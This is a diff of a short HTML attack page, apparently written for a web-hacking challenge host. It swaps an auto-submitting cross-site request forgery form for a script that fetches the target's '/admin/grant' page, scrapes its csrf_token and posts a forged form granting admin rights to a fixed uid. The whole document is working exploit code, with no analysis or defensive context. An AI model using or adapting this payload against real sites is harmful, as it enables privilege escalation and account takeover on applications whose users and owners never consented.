@@ -1,5 +1,13 @@
-<body onload="document.getElementById('f').submit()">
-<form id="f" method="POST" action="https://web12.webhack.it/admin/grant">
-  <input name="uid" value="+4OVcjo1S50yitGVa65BlevLpqE=">
-</form>
-</body>
+<script>
+fetch('https://web12.webhack.it/admin/grant')
+  .then(r => r.text())
+  .then(html => {
+    const token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://web12.webhack.it/admin/grant';
+    form.innerHTML = `<input name="csrf_token" value="${token}"><input name="uid" value="+4OVcjo1S50yitGVa65BlevLpqE=">`;
+    document.body.appendChild(form);
+    form.submit();
+  });
+</script>
